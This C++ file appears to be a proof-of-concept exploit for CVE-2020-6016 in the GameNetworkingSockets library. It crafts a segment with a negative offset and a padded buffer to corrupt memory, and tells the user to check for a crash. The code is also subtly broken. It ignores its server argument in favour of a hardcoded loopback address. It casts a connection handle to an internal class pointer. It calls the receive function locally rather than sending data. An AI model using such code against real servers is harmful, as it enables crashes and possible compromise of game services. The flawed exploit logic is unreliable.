#include <steamnetworkingsockets/steamnetworkingsockets_snp.h>
#include <steamnetworkingsockets/steamnetworkingsockets.h>
#include <iostream>
#include <cstring>
#include <thread>

using namespace SteamNetworkingSocketsLib;

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <server_ip[:port]>" << std::endl;
        return 1;
    }
    const char* server = argv[1];
    SteamDatagramErrMsg errMsg;
    if (!GameNetworkingSockets_Init(nullptr, errMsg)) {
        std::cerr << "Failed to init SteamNetworkingSockets: " << errMsg << std::endl;
        return 1;
    }
    SteamNetworkingIPAddr addr;
    addr.Clear();
    addr.SetIPv4(127, 0, 0, 1, 27036);  // default port, adjust as needed

    HSteamNetConnection conn = SteamNetworkingSockets()->ConnectByIPAddress(addr, 0, 0);
    std::this_thread::sleep_for(std::chrono::seconds(1)); // wait for connection handshake

    // Craft a segment with negative offset to trigger CVE-2020-6016
    uint64_t msgNum = 1;
    int32_t offset = -0x180;
    char data[0x400];
    memset(data, 'A', sizeof(data));
    bool lastSegment = true;

    // Hack: reinterpret handle to internal class to call the vulnerable function
    auto pConn = reinterpret_cast<SteamNetworkingSocketsLib::CSteamNetworkConnectionBase*>(conn);
    pConn->SNP_ReceiveUnreliableSegment(msgNum, offset, data, sizeof(data), lastSegment, 0);

    std::cout << "Sent crafted segment, check for crash." << std::endl;
    GameNetworkingSockets_Kill();
    return 0;
}